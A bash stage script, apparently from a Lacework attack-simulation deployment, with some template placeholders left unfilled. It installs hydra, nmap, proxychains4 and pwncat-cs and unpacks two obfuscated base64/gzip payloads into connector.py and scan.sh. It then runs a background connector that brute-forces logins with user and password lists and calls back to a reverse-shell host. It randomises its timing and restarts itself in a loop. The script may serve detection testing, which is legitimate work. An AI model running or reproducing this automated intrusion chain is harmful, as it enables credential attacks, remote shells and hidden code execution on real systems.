#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $$)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES="proxychains4 nmap hydra python3-pip"
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES="nmap python3-pip"
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";
if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
    yum update -y
    yum install -y git
    yum groupinstall -y 'Development Tools'
    # proxychains4
    cd /usr/local/src
    git clone https://github.com/rofl0r/proxychains-ng
    cd proxychains-ng
    ./configure && make && make install
    make install-config
    # hydra
    cd /usr/local/src
    git clone https://github.com/vanhauser-thc/thc-hydra
    cd thc-hydra
    ./configure && make && make install
fi

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=attack_delay
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
PWNCAT_LOG="/tmp/pwncat_connector.log"
PWNCAT_SESSION="pwncat_connector"
PWNCAT_SESSION_LOCK="/tmp/pwncat_connector_session.lock"
if [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
    log "Pwncat session lock $PWNCAT_SESSION_LOCK exists and $PWNCAT_SESSION screen session running. Skipping setup."
else
    rm -f "$PWNCAT_SESSION_LOCK"
    log "Session lock doesn't exist and screen session not runing. Continuing..."
    screen -S $PWNCAT_SESSION -X quit
    screen -wipe
    log "cleaning app directory"
    rm -rf /pwncat_connector
    mkdir -p /pwncat_connector/plugins /pwncat_connector/resources
    cd /pwncat_connector
    echo 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 | base64 -d | gunzip > connector.py
    echo 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 | base64 -d | gunzip > scan.sh
    log "installing required python3.9..."
    apt-get install -y python3.9 >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust netifaces>=0.11.0 netifaces-plus>=0.12.4 jinja2 jc >> $LOGFILE 2>&1
    python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    log "checking for user and password list before starting..."
    while ! [ -f "user_list" ] || ! [ -f "password_list" ]; do
        log "waiting for user_list and password_list..."
        sleep 30
    done
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
        mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
        log "starting background process via screen..."
        screen -S $PWNCAT_SESSION -X quit
        screen -wipe
        screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m /bin/bash -c "cd /pwncat_connector && python3.9 connector.py --target-ip=\"target_ip\" --target-port=\"69\" --user-list=\"user_list\" --password-list=\"password_list\" --task=\"task\" --payload=\"cGF5bG9hZA==\" --reverse-shell-host=\"reverse_shell_host\"  --reverse-shell-port=\"reverse_shell_port\""
        screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
        log "connector started."
        log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
        sleep 1800
        log "sleep complete - checking for running sessions..."
        while [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; do
            log "pwncat session still running - waiting before restart..."
            sleep 600
        done
        log "no pwncat sessions found - continuing..."
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break
        else
            log "restarting loop..."
        fi
    done
fi
log "done."

log "done next stage payload execution."

log "Done"